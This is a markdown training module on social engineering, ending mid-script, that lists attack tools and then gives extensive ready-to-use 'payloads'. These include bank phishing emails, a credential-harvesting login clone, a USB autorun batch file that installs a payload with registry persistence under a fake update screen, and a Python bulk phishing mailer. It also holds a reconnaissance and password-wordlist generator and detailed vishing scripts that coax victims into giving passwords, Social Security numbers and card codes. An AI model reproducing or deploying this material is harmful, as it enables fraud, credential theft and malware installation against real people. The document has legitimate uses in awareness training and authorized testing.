# Social Engineering - Topics Overview

## Topic Explanation
Social Engineering is the art of manipulating people to divulge confidential information or perform actions that compromise security. Unlike technical attacks, social engineering exploits human psychology, trust, and emotions to bypass security controls. This module covers various social engineering techniques including human-based attacks (impersonation, shoulder surfing, dumpster diving), computer-based attacks (phishing, spear phishing), and mobile-based attacks. It explores the psychological principles behind social engineering, attack vectors, prevention strategies, and awareness training to help organizations defend against these human-centric threats.

## Articles for Further Reference
- [NIST Special Publication 800-50: Building an Information Technology Security Awareness and Training Program](https://csrc.nist.gov/publications/detail/sp/800-50/final)
- [SANS Institute: Social Engineering - The Art of Human Hacking](https://www.sans.org/white-papers/36972/)
- [Anti-Phishing Working Group (APWG) Reports](https://apwg.org/trendsreports/)
- [Verizon Data Breach Investigations Report - Social Engineering Section](https://www.verizon.com/business/resources/reports/dbir/)
- [Social Engineering Research by Christopher Hadnagy](https://www.social-engineer.org/framework/)

## Reference Links
- [Social Engineering Framework](https://www.social-engineer.org/framework/)
- [Anti-Phishing Working Group](https://apwg.org/)
- [KnowBe4 Security Awareness Training](https://www.knowbe4.com/)
- [OWASP Social Engineering](https://owasp.org/www-community/attacks/Social_Engineering)
- [MITRE ATT&CK - Initial Access Techniques](https://attack.mitre.org/tactics/TA0001/)
- [Have I Been Pwned](https://haveibeenpwned.com/)

## Available Tools for the Topic

### Tool Name: Social-Engineer Toolkit (SET)
**Description:** Open-source penetration testing framework designed for social engineering attacks, including spear-phishing, credential harvesting, and website cloning.

**Example Usage:**
```bash
# Start SET
sudo setoolkit

# Select attack vector
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method

# Clone a website for credential harvesting
# Select: Website Attack Vectors -> Credential Harvester -> Site Cloner
# Enter target URL: https://gmail.com
# Set local IP for harvester

# Generate phishing emails
# Select: Social-Engineering Attacks -> Spear-Phishing Attack Vectors
# Create custom email templates
```

**Reference Links:**
- [SET GitHub Repository](https://github.com/trustedsec/social-engineer-toolkit)
- [SET Documentation](https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/QUICK_TUTORIAL)

### Tool Name: Gophish
**Description:** Open-source phishing toolkit designed for businesses and penetration testers to conduct real-world phishing simulations.

**Example Usage:**
```bash
# Install and start Gophish
./gophish

# Access web interface at https://localhost:3333
# Default credentials: admin/gophish

# Create email template
# Set up landing page
# Configure sending profile (SMTP settings)
# Launch phishing campaign
# Monitor results and statistics
```

**Reference Links:**
- [Gophish Official Site](https://getgophish.com/)
- [Gophish Documentation](https://docs.getgophish.com/)

### Tool Name: King Phisher
**Description:** Tool for testing and promoting user awareness by simulating real-world phishing attacks in a controlled environment.

**Example Usage:**
```bash
# Start King Phisher server
king-phisher-server

# Start King Phisher client
king-phisher-client

# Configure campaign settings
# Create message templates
# Set up landing pages
# Launch campaign
# Analyze user interactions
```

**Reference Links:**
- [King Phisher GitHub](https://github.com/rsmusllp/king-phisher)

### Tool Name: Evilginx2
**Description:** Man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for bypassing 2-factor authentication.

**Example Usage:**
```bash
# Start Evilginx2
sudo evilginx2

# Set up phishlet for target service
phishlets hostname gmail evilsite.com
phishlets enable gmail

# Create lure URL
lures create gmail
lures get-url 0

# Monitor captured sessions
sessions
```

**Reference Links:**
- [Evilginx2 GitHub](https://github.com/kgretzky/evilginx2)

### Tool Name: BeEF (Browser Exploitation Framework)
**Description:** Penetration testing tool that focuses on the web browser to assess security posture through client-side attack vectors.

**Example Usage:**
```bash
# Start BeEF
./beef

# Access control panel at http://127.0.0.1:3000/ui/panel
# Default credentials: beef/beef

# Hook browsers using JavaScript payload
<script src="http://your-beef-server:3000/hook.js"></script>

# Execute browser exploits
# Social engineering attacks
# Information gathering
```

**Reference Links:**
- [BeEF Official Site](https://beefproject.com/)
- [BeEF GitHub](https://github.com/beefproject/beef)

### Tool Name: Maltego
**Description:** Link analysis tool for gathering and connecting information for investigative tasks and social engineering reconnaissance.

**Example Usage:**
```bash
# Start Maltego
maltego

# Create new graph
# Add person entity
# Run transforms to gather information
# - Email addresses
# - Social media profiles
# - Phone numbers
# - Associated domains
```

**Reference Links:**
- [Maltego Official Site](https://www.maltego.com/)

## All Possible Payloads for Manual Approach

### Phishing Email Templates
```html
<!-- Banking Phishing Template -->
Subject: Urgent: Verify Your Account Information

<html>
<body>
<div style="font-family: Arial, sans-serif;">
    <div style="background-color: #1e3a8a; color: white; padding: 20px;">
        <h2>Important Security Notice</h2>
    </div>
    <div style="padding: 20px;">
        <p>Dear Valued Customer,</p>
        <p>We have detected unusual activity on your account. For your security, we need you to verify your account information immediately.</p>
        <p><strong>Account Status:</strong> <span style="color: red;">SUSPENDED</span></p>
        <p>Please click the link below to verify your account:</p>
        <a href="http://phishing-site.com/verify" style="background-color: #1e3a8a; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">Verify Account Now</a>
        <p><small>If you do not verify within 24 hours, your account will be permanently closed.</small></p>
        <p>Regards,<br>Security Team</p>
    </div>
</div>
</body>
</html>
```

### Spear Phishing Payloads
```
# Executive Targeting Template
Subject: Re: Board Meeting - Confidential Financial Report

Dear [CEO Name],

As requested during yesterday's call, I'm sending the confidential Q4 financial projections. Please review the attached document before tomorrow's board meeting.

The password for the document is: [CompanyName]2024

Best regards,
[CFO Name]

Attachment: Q4_Financial_Report_CONFIDENTIAL.pdf.exe
```

### Credential Harvesting Forms
```html
<!-- Login Form Clone -->
<!DOCTYPE html>
<html>
<head>
    <title>Secure Login - Company Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; }
        .login-container { 
            max-width: 400px; margin: 100px auto; 
            background: white; padding: 40px; 
            border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); 
        }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { 
            width: 100%; padding: 12px; border: 1px solid #ddd; 
            border-radius: 5px; font-size: 16px; 
        }
        .btn-login { 
            width: 100%; padding: 12px; background-color: #007bff; 
            color: white; border: none; border-radius: 5px; 
            font-size: 16px; cursor: pointer; 
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Company Portal Login</h2>
        <form action="harvest.php" method="POST">
            <div class="form-group">
                <label>Username:</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit" class="btn-login">Sign In</button>
        </form>
        <p><small>Forgot your password? <a href="#">Reset here</a></small></p>
    </div>
</body>
</html>
```

### USB Drop Attack Payloads
```batch
REM USB autorun payload
@echo off
title System Update
echo Installing critical security update...
echo Please wait...

REM Copy payload to system
copy payload.exe %APPDATA%\WindowsUpdate.exe

REM Create persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SecurityUpdate" /t REG_SZ /d "%APPDATA%\WindowsUpdate.exe"

REM Execute payload silently
start /min %APPDATA%\WindowsUpdate.exe

REM Show fake update progress
for /l %%i in (1,1,100) do (
    echo Progress: %%i%%
    timeout /t 1 /nobreak >nul
)

echo Update completed successfully!
pause
exit
```

### Pretexting Scripts
```
# IT Support Pretext
"Hi [Name], this is [Fake Name] from IT Support. We're currently updating our security systems and need to verify your login credentials to ensure your account isn't affected by the recent security breach. Can you please confirm your username and current password so I can update your account in our new secure system?"

# HR Department Pretext
"Hello [Name], this is [Fake Name] from Human Resources. We're updating our employee database and noticed some discrepancies in your file. To ensure your payroll and benefits aren't affected, I need to verify some personal information including your employee ID and the password you use to access the company portal."

# Customer Service Pretext
"Good morning [Name], this is [Fake Name] from customer service. We've detected some unusual activity on your account and want to make sure your information is secure. To verify your identity and protect your account, could you please confirm your login credentials?"
```

### Social Media Reconnaissance Payloads
```python
#!/usr/bin/env python3
import requests
import json

# Social media information gathering
def gather_social_info(target_name):
    platforms = [
        f"https://www.facebook.com/{target_name}",
        f"https://www.linkedin.com/in/{target_name}",
        f"https://twitter.com/{target_name}",
        f"https://instagram.com/{target_name}",
        f"https://github.com/{target_name}"
    ]
    
    found_profiles = []
    for platform in platforms:
        try:
            response = requests.get(platform, timeout=5)
            if response.status_code == 200:
                found_profiles.append(platform)
        except:
            pass
    
    return found_profiles

# Email enumeration
def enumerate_emails(target_domain):
    common_formats = [
        "first.last@{domain}",
        "firstlast@{domain}",
        "first@{domain}",
        "last@{domain}",
        "f.last@{domain}",
        "first.l@{domain}"
    ]
    
    return [fmt.format(domain=target_domain) for fmt in common_formats]
```

## Example Payloads

### 1. Comprehensive Phishing Campaign Framework
```python
#!/usr/bin/env python3
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import random
import time

class PhishingCampaign:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
        self.targets = []
        self.templates = {}
    
    def load_targets(self, filename):
        """Load target email addresses from file"""
        with open(filename, 'r') as f:
            self.targets = [line.strip() for line in f if line.strip()]
    
    def create_template(self, name, subject, body, attachment=None):
        """Create email template"""
        self.templates[name] = {
            'subject': subject,
            'body': body,
            'attachment': attachment
        }
    
    def personalize_email(self, template, target_email):
        """Personalize email content for target"""
        # Extract name from email
        name = target_email.split('@')[0].replace('.', ' ').title()
        
        # Replace placeholders
        subject = template['subject'].replace('[NAME]', name)
        body = template['body'].replace('[NAME]', name)
        body = body.replace('[EMAIL]', target_email)
        
        return subject, body
    
    def send_phishing_email(self, target_email, template_name):
        """Send phishing email to target"""
        if template_name not in self.templates:
            raise ValueError(f"Template {template_name} not found")
        
        template = self.templates[template_name]
        subject, body = self.personalize_email(template, target_email)
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = target_email
        msg['Subject'] = subject
        
        # Add body
        msg.attach(MIMEText(body, 'html'))
        
        # Add attachment if specified
        if template['attachment']:
            with open(template['attachment'], 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
            
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename= {template["attachment"]}'
            )
            msg.attach(part)
        
        # Send email
        try:
            context = ssl.create_default_context()
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls(context=context)
                server.login(self.username, self.password)
                server.send_message(msg)
            
            print(f"Email sent to {target_email}")
            return True
        except Exception as e:
            print(f"Failed to send email to {target_email}: {e}")
            return False
    
    def launch_campaign(self, template_name, delay_range=(1, 5)):
        """Launch phishing campaign against all targets"""
        print(f"Launching campaign '{template_name}' against {len(self.targets)} targets")
        
        successful = 0
        for target in self.targets:
            if self.send_phishing_email(target, template_name):
                successful += 1
            
            # Random delay between emails
            delay = random.uniform(*delay_range)
            time.sleep(delay)
        
        print(f"Campaign completed: {successful}/{len(self.targets)} emails sent")

# Example usage
if __name__ == "__main__":
    # Initialize campaign
    campaign = PhishingCampaign(
        smtp_server="smtp.gmail.com",
        smtp_port=587,
        username="attacker@gmail.com",
        password="app_password"
    )
    
    # Load targets
    campaign.load_targets("targets.txt")
    
    # Create email template
    subject = "Urgent: Account Security Alert - Action Required"
    body = """
    <html>
    <body>
    <p>Dear [NAME],</p>
    <p>We have detected suspicious activity on your account ([EMAIL]).</p>
    <p>Please click <a href="http://phishing-site.com/verify?email=[EMAIL]">here</a> to verify your account immediately.</p>
    <p>Failure to verify within 24 hours will result in account suspension.</p>
    <p>Best regards,<br>Security Team</p>
    </body>
    </html>
    """
    
    campaign.create_template("security_alert", subject, body)
    
    # Launch campaign
    campaign.launch_campaign("security_alert")
```

### 2. Advanced Social Engineering Reconnaissance
```python
#!/usr/bin/env python3
import requests
import re
import json
from bs4 import BeautifulSoup
import whois
import dns.resolver

class SocialEngineeringRecon:
    def __init__(self, target_domain):
        self.target_domain = target_domain
        self.employees = []
        self.email_patterns = []
        self.social_profiles = []
        self.company_info = {}
    
    def gather_whois_info(self):
        """Gather WHOIS information"""
        try:
            w = whois.whois(self.target_domain)
            self.company_info['registrar'] = w.registrar
            self.company_info['creation_date'] = w.creation_date
            self.company_info['expiration_date'] = w.expiration_date
            self.company_info['name_servers'] = w.name_servers
            print(f"WHOIS info gathered for {self.target_domain}")
        except Exception as e:
            print(f"WHOIS lookup failed: {e}")
    
    def linkedin_scraping(self, company_name):
        """Scrape LinkedIn for employee information"""
        # Note: This is for educational purposes only
        # Real implementation would need to handle LinkedIn's anti-scraping measures
        
        search_url = f"https://www.linkedin.com/search/results/people/?keywords={company_name}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        try:
            response = requests.get(search_url, headers=headers)
            # Parse response and extract employee names, titles, etc.
            # This is a simplified example
            print(f"LinkedIn search performed for {company_name}")
        except Exception as e:
            print(f"LinkedIn scraping failed: {e}")
    
    def email_format_detection(self):
        """Detect email format patterns"""
        # Common email patterns
        patterns = [
            "first.last@{domain}",
            "firstlast@{domain}",
            "first@{domain}",
            "last@{domain}",
            "f.last@{domain}",
            "first.l@{domain}",
            "flast@{domain}"
        ]
        
        self.email_patterns = [p.format(domain=self.target_domain) for p in patterns]
        print(f"Generated {len(self.email_patterns)} email patterns")
    
    def gather_social_media_info(self, target_name):
        """Gather social media information"""
        platforms = {
            'twitter': f"https://twitter.com/{target_name}",
            'facebook': f"https://facebook.com/{target_name}",
            'instagram': f"https://instagram.com/{target_name}",
            'linkedin': f"https://linkedin.com/in/{target_name}",
            'github': f"https://github.com/{target_name}"
        }
        
        for platform, url in platforms.items():
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    self.social_profiles.append({
                        'platform': platform,
                        'url': url,
                        'found': True
                    })
                    print(f"Found {platform} profile: {url}")
            except:
                pass
    
    def dns_enumeration(self):
        """Perform DNS enumeration"""
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
        dns_info = {}
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target_domain, record_type)
                dns_info[record_type] = [str(answer) for answer in answers]
            except:
                dns_info[record_type] = []
        
        self.company_info['dns'] = dns_info
        print(f"DNS enumeration completed for {self.target_domain}")
    
    def technology_detection(self):
        """Detect technologies used by target website"""
        try:
            response = requests.get(f"http://{self.target_domain}")
            headers = response.headers
            
            # Check server information
            server = headers.get('Server', 'Unknown')
            powered_by = headers.get('X-Powered-By', 'Unknown')
            
            # Check for common frameworks in content
            content = response.text.lower()
            frameworks = []
            
            if 'wordpress' in content:
                frameworks.append('WordPress')
            if 'drupal' in content:
                frameworks.append('Drupal')
            if 'joomla' in content:
                frameworks.append('Joomla')
            if 'react' in content:
                frameworks.append('React')
            if 'angular' in content:
                frameworks.append('Angular')
            
            self.company_info['technology'] = {
                'server': server,
                'powered_by': powered_by,
                'frameworks': frameworks
            }
            
            print(f"Technology detection completed")
            
        except Exception as e:
            print(f"Technology detection failed: {e}")
    
    def generate_wordlist(self):
        """Generate password wordlist based on company info"""
        wordlist = []
        company_name = self.target_domain.split('.')[0]
        
        # Common password patterns
        years = ['2023', '2024', '2025']
        seasons = ['spring', 'summer', 'fall', 'winter']
        common_words = ['password', 'admin', 'welcome', 'login']
        
        # Generate combinations
        for word in [company_name] + common_words:
            wordlist.append(word)
            wordlist.append(word.capitalize())
            
            for year in years:
                wordlist.append(f"{word}{year}")
                wordlist.append(f"{word.capitalize()}{year}")
            
            for season in seasons:
                wordlist.append(f"{word}{season}")
                wordlist.append(f"{word.capitalize()}{season}")
        
        # Save wordlist
        with open(f"{company_name}_wordlist.txt", 'w') as f:
            for word in set(wordlist):
                f.write(f"{word}\n")
        
        print(f"Generated wordlist with {len(set(wordlist))} entries")
    
    def generate_report(self):
        """Generate reconnaissance report"""
        report = {
            'target_domain': self.target_domain,
            'company_info': self.company_info,
            'email_patterns': self.email_patterns,
            'social_profiles': self.social_profiles,
            'employees': self.employees
        }
        
        with open(f"{self.target_domain}_recon_report.json", 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"Reconnaissance report saved")
    
    def run_full_recon(self):
        """Run complete reconnaissance"""
        print(f"Starting reconnaissance for {self.target_domain}")
        
        self.gather_whois_info()
        self.dns_enumeration()
        self.technology_detection()
        self.email_format_detection()
        self.generate_wordlist()
        self.generate_report()
        
        print("Reconnaissance completed")

# Example usage
if __name__ == "__main__":
    recon = SocialEngineeringRecon("target-company.com")
    recon.run_full_recon()
```

### 3. USB Drop Attack Simulation
```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import time

class USBDropAttack:
    def __init__(self):
        self.usb_label = "SECURITY_UPDATE"
        self.payload_name = "SecurityPatch.exe"
        self.autorun_inf = "autorun.inf"
    
    def create_payload(self):
        """Create malicious payload"""
        # This would typically be a compiled executable
        # For demonstration, we'll create a batch script
        
        payload_content = '''
@echo off
title Critical Security Update
color 0A

echo.
echo =====================================
echo    CRITICAL SECURITY UPDATE v2.1
echo =====================================
echo.
echo Installing security patches...
echo.

REM Simulate update progress
for /l %%i in (1,1,10) do (
    echo Installing patch %%i of 10...
    timeout /t 1 /nobreak >nul
)

echo.
echo Configuring system security...
timeout /t 2 /nobreak >nul

REM Create persistence (educational purposes)
copy "%~f0" "%APPDATA%\\WindowsSecurityUpdate.bat"
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SecurityUpdate" /t REG_SZ /d "%APPDATA%\\WindowsSecurityUpdate.bat" /f >nul 2>&1

echo.
echo Collecting system information for security analysis...
timeout /t 2 /nobreak >nul

REM Gather system information
systeminfo > "%TEMP%\\sysinfo.txt"
ipconfig /all > "%TEMP%\\netinfo.txt"
net user > "%TEMP%\\userinfo.txt"

echo.
echo Security update completed successfully!
echo Your system is now protected against the latest threats.
echo.
pause
exit
'''
        
        with open(self.payload_name, 'w') as f:
            f.write(payload_content)
        
        print(f"Payload created: {self.payload_name}")
    
    def create_autorun(self):
        """Create autorun.inf file"""
        autorun_content = f'''[autorun]
open={self.payload_name}
icon={self.payload_name},0
label={self.usb_label}
action=Install Critical Security Update
'''
        
        with open(self.autorun_inf, 'w') as f:
            f.write(autorun_content)
        
        print(f"Autorun file created: {self.autorun_inf}")
    
    def create_decoy_files(self):
        """Create convincing decoy files"""
        decoy_files = [
            "Security_Bulletin_KB2024001.pdf",
            "System_Patch_Notes.txt",
            "Installation_Guide.docx",
            "License_Agreement.txt"
        ]
        
        for filename in decoy_files:
            # Create empty files (would normally contain convincing content)
            with open(filename, 'w') as f:
                f.write(f"# {filename}\nThis file contains security information.\n")
        
        print(f"Created {len(decoy_files)} decoy files")
    
    def modify_file_attributes(self):
        """Hide malicious files and make them system files"""
        try:
            # Hide autorun.inf
            subprocess.run(['attrib', '+H', '+S', self.autorun_inf], 
                         capture_output=True)
            
            # Make payload look like system file
            subprocess.run(['attrib', '+S', self.payload_name], 
                         capture_output=True)
            
            print("File attributes modified")
        except Exception as e:
            print(f"Failed to modify file attributes: {e}")
    
    def create_usb_drop_package(self, output_dir="usb_drop_package"):
        """Create complete USB drop package"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Change to output directory
        original_dir = os.getcwd()
        os.chdir(output_dir)
        
        try:
            print(f"Creating USB drop package in {output_dir}")
            
            self.create_payload()
            self.create_autorun()
            self.create_decoy_files()
            self.modify_file_attributes()
            
            print("\nUSB Drop Package Contents:")
            for item in os.listdir('.'):
                size = os.path.getsize(item)
                print(f"  {item} ({size} bytes)")
            
            print(f"\nPackage created successfully in {os.path.abspath('.')}")
            print("Copy these files to a USB drive for the attack.")
            
        finally:
            os.chdir(original_dir)

# Example usage
if __name__ == "__main__":
    usb_attack = USBDropAttack()
    usb_attack.create_usb_drop_package()
```

### 4. Voice Phishing (Vishing) Call Script Generator
```python
#!/usr/bin/env python3
import random
from datetime import datetime, timedelta

class VishingScriptGenerator:
    def __init__(self):
        self.scripts = {}
        self.target_info = {}
    
    def set_target_info(self, name, company, phone, role="Employee"):
        """Set target information"""
        self.target_info = {
            'name': name,
            'company': company,
            'phone': phone,
            'role': role
        }
    
    def generate_it_support_script(self):
        """Generate IT support vishing script"""
        incident_id = f"INC{random.randint(100000, 999999)}"
        
        script = f"""
IT SUPPORT VISHING SCRIPT
========================

TARGET: {self.target_info.get('name', '[TARGET_NAME]')}
COMPANY: {self.target_info.get('company', '[COMPANY_NAME]')}
INCIDENT ID: {incident_id}

OPENING:
--------
"Hello, is this {self.target_info.get('name', '[TARGET_NAME]')}? This is [YOUR_NAME] from IT Support at {self.target_info.get('company', '[COMPANY_NAME]')}. I'm calling regarding incident #{incident_id}. Do you have a moment to speak?"

HOOK:
-----
"We've detected some unusual activity on your network account that could indicate a security breach. We need to verify your account immediately to prevent any data loss or unauthorized access."

URGENCY:
--------
"This is quite urgent - we've seen similar attacks at other companies result in significant data theft. We need to act quickly to secure your account before the end of business today."

CREDENTIAL REQUEST:
------------------
"To verify your identity and update your security settings, I need to confirm your current login credentials. What username do you use to access the company systems?"

[WAIT FOR RESPONSE]

"And to verify this is really you, can you confirm your current password? I need to make sure the account hasn't been compromised."

ADDITIONAL INFORMATION:
-----------------------
"We also need to update your security questions. What was the name of your first pet? And your mother's maiden name?"

CLOSING:
--------
"Perfect, I've updated your account with enhanced security. You should receive a confirmation email within the next hour. If you experience any login issues, please call this number immediately."

OBJECTION HANDLING:
------------------
If target is suspicious:
"I understand your concern about security. Let me transfer you to my supervisor, [SUPERVISOR_NAME], who can verify this request through our security department."

If target refuses to give password:
"That's actually a good security practice. Let me send you a secure link where you can update your password yourself. What's your email address?"

If target wants to call back:
"The incident response team is only available for the next 30 minutes. After that, we'll need to lock your account as a security precaution, which could take 3-5 business days to resolve."
"""
        
        self.scripts['it_support'] = script
        return script
    
    def generate_hr_script(self):
        """Generate HR department vishing script"""
        script = f"""
HR DEPARTMENT VISHING SCRIPT
===========================

TARGET: {self.target_info.get('name', '[TARGET_NAME]')}
COMPANY: {self.target_info.get('company', '[COMPANY_NAME]')}

OPENING:
--------
"Hi {self.target_info.get('name', '[TARGET_NAME]')}, this is [YOUR_NAME] from Human Resources. I hope I'm not catching you at a bad time. I'm calling about an important update to your employee benefits."

HOOK:
-----
"We're implementing a new security system for our benefits portal, and we need to verify your information to ensure your health insurance and 401k accounts aren't affected."

URGENCY:
--------
"The deadline for this verification is today, and if we don't update your information, your benefits could be suspended starting next week."

INFORMATION REQUEST:
-------------------
"I need to verify a few pieces of information in our system:

1. Can you confirm your employee ID number?
2. What's the password you use to access the benefits portal?
3. For security purposes, can you verify your Social Security number?
4. What's your current home address on file?"

SOCIAL ENGINEERING:
------------------
"I see here that you haven't logged into the benefits system in a while. That's actually why we need to do this verification - inactive accounts are being targeted by hackers."

CLOSING:
--------
"Thank you for your cooperation. Your benefits account is now secure. You'll receive a confirmation email from benefits@{self.target_info.get('company', '[COMPANY]').replace(' ', '').lower()}.com within 24 hours."

OBJECTION HANDLING:
------------------
If target is suspicious:
"I completely understand your caution. Would you prefer if I sent you an official email from HR that you can respond to? What's your work email address?"

If target wants to verify:
"Of course! You can call our main HR line and ask for extension 4782. However, I should mention that I'm only in the office for the next 20 minutes, so if you call back later, this verification might be delayed until next week."
"""
        
        self.scripts['hr_department'] = script
        return script
    
    def generate_bank_script(self):
        """Generate banking vishing script"""
        transaction_amount = random.choice(['$1,247.83', '$892.50', '$2,156.99'])
        
        script = f"""
BANKING SECURITY VISHING SCRIPT
==============================

TARGET: {self.target_info.get('name', '[TARGET_NAME]')}

OPENING:
--------
"Hello, this is [YOUR_NAME] calling from the Security Department at [BANK_NAME]. Am I speaking with {self.target_info.get('name', '[TARGET_NAME]')}?"

URGENT HOOK:
-----------
"I'm calling because we've detected a suspicious transaction on your account for {transaction_amount} that was just processed about 10 minutes ago. Did you authorize this transaction?"

[CUSTOMER WILL LIKELY SAY NO]

ESCALATION:
----------
"I thought so. This appears to be fraudulent activity. I'm going to immediately freeze your account to prevent any additional unauthorized charges. However, I need to verify your identity first."

VERIFICATION REQUEST:
--------------------
"For security purposes, I need you to confirm:
1. Your full account number
2. The security code on the back of your card
3. Your online banking password
4. Your mother's maiden name (security question)"

URGENCY BUILDING:
----------------
"I see there's another pending transaction for $3,500 that's about to process. We need to stop this immediately. Can you give me that information now?"

ADDITIONAL HOOK:
---------------
"I'm also seeing login attempts from an IP address in [FOREIGN_COUNTRY]. Someone is definitely trying to access your account right now."

CLOSING:
--------
"Thank you, I've secured your account and reversed the fraudulent charges. You'll see the credit within 24-48 hours. We're also sending you a new card, which should arrive in 7-10 business days."

OBJECTION HANDLING:
------------------
If target wants to call back:
"Sir/Ma'am, every minute we delay gives the criminals more time to drain your account. I have the fraud prevention team standing by, but they're only available for the next few minutes."

If target is suspicious:
"I understand your concern, which is exactly why we have these security protocols. You can hang up and call the number on the back of your card, but please mention case number FR{random.randint(100000, 999999)} so they can find your file quickly."
"""
        
        self.scripts['banking'] = script
        return script
    
    def generate_all_scripts(self):
        """Generate all vishing scripts"""
        print("Generating vishing scripts...")
        
        self.generate_it_support_script()
        self.generate_hr_script()
        self.generate_bank_script()
        
        return self.scripts
    
    def save_scripts_to_file(self, filename="vishing_scripts.txt"):
        """Save all scripts to file"""
        with open(filename, 'w') as f:
            f.write(f"VISHING SCRIPTS GENERATED ON {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for script_type, script_content in self.scripts.items():
                f.write(script_content)
                f.write("\n" + "=" * 80 + "\n\n")
        
        print(f"Scripts saved to {filename}")

# Example usage
if __name__ == "__main__":
    generator = VishingScriptGenerator()
    generator.set_target_info(
        name="John Smith",
        company="Acme Corporation",
        phone="555-0123",
        role="Software Developer"
    )
    
    scripts = generator.generate_all_scripts()
    generator.save_scripts_to_file()
    
    print("Available scripts:")
    for script_type in scripts.keys():
        print(f"- {script_type}")
```

### 5. Social Engineering Assessment Report Generator
```python
#!/usr/bin/env python3
import json
from datetime import datetime

class SocialEngineeringAssessment:
    def __init__(self, company_name):
        self.company_name = company_name
        self.assessment_date = datetime.now()
        self.results = {
            'phishing_campaign': {},
            'vishing_attempts': {},
            'physical_security': {},
            'osint_findings': {},
            'recommendations': []
        }
    
    def record_phishing_results(self, emails_sent, clicked_links, entered_credentials, reported_phishing):
        """Record phishing campaign results"""
        self.results['phishing_campaign'] = {
            'emails_sent': emails_sent,
            'clicked_links': clicked_links,
            'entered_credentials': entered_credentials,
            'reported_phishing': reported_phishing,
            'click_rate': (clicked_links / emails_sent) * 100 if emails_sent > 0 else 0,
            'credential_rate': (entered_credentials / emails_sent) * 100 if emails_sent > 0 else 0,
            'report_rate': (reported_phishing / emails_sent) * 100 if emails_sent > 0 else 0
        }
    
    def record_vishing_results(self, calls_made, successful_calls, information_gathered):
        """Record vishing attempt results"""
        self.results['vishing_attempts'] = {
            'calls_made': calls_made,
            'successful_calls': successful_calls,
            'information_gathered': information_gathered,
            'success_rate': (successful_calls / calls_made) * 100 if calls_made > 0 else 0
        }
    
    def record_physical_security(self, tailgating_attempts, successful_tailgating, usb_drops, usb_executed):
        """Record physical security test results"""
        self.results['physical_security'] = {
            'tailgating_attempts': tailgating_attempts,
            'successful_tailgating': successful_tailgating,
            'usb_drops': usb_drops,
            'usb_executed': usb_executed,
            'tailgating_success_rate': (successful_tailgating / tailgating_attempts) * 100 if tailgating_attempts > 0 else 0,
            'usb_execution_rate': (usb_executed / usb_drops) * 100 if usb_drops > 0 else 0
        }
    
    def record_osint_findings(self, employees_found, email_formats, social_profiles, leaked_credentials):
        """Record OSINT findings"""
        self.results['osint_findings'] = {
            'employees_identified': employees_found,
            'email_formats_discovered': email_formats,
            'social_media_profiles': social_profiles,
            'leaked_credentials_found': leaked_credentials
        }
    
    def add_recommendation(self, category, priority, description, implementation_effort):
        """Add security recommendation"""
        self.results['recommendations'].append({
            'category': category,
            'priority': priority,
            'description': description,
            'implementation_effort': implementation_effort,
            'timeline': self.get_timeline_by_priority(priority)
        })
    
    def get_timeline_by_priority(self, priority):
        """Get implementation timeline based on priority"""
        timelines = {
            'Critical': 'Immediate (1-7 days)',
            'High': 'Short-term (1-4 weeks)',
            'Medium': 'Medium-term (1-3 months)',
            'Low': 'Long-term (3-6 months)'
        }
        return timelines.get(priority, 'TBD')
    
    def calculate_risk_score(self):
        """Calculate overall risk score"""
        phishing = self.results['phishing_campaign']
        vishing = self.results['vishing_attempts']
        physical = self.results['physical_security']
        
        # Risk factors (higher percentages = higher risk)
        phishing_risk = phishing.get('click_rate', 0) * 0.3 + phishing.get('credential_rate', 0) * 0.7
        vishing_risk = vishing.get('success_rate', 0)
        physical_risk = physical.get('tailgating_success_rate', 0) * 0.6 + physical.get('usb_execution_rate', 0) * 0.4
        
        # Weighted average
        overall_risk = (phishing_risk * 0.4 + vishing_risk * 0.3 + physical_risk * 0.3)
        
        return min(overall_risk, 100)  # Cap at 100%
    
    def get_risk_level(self, risk_score):
        """Determine risk level based on score"""
        if risk_score >= 75:
            return "Critical"
        elif risk_score >= 50:
            return "High"
        elif risk_score >= 25:
            return "Medium"
        else:
            return "Low"
    
    def generate_executive_summary(self):
        """Generate executive summary"""
        risk_score = self.calculate_risk_score()
        risk_level = self.get_risk_level(risk_score)
        
        phishing = self.results['phishing_campaign']
        critical_recs = len([r for r in self.results['recommendations'] if r['priority'] == 'Critical'])
        
        summary = f"""
EXECUTIVE SUMMARY
================

Company: {self.company_name}
Assessment Date: {self.assessment_date.strftime('%B %d, %Y')}
Overall Risk Score: {risk_score:.1f}/100 ({risk_level} Risk)

KEY FINDINGS:
• {phishing.get('click_rate', 0):.1f}% of employees clicked on phishing emails
• {phishing.get('credential_rate', 0):.1f}% of employees entered credentials on fake sites
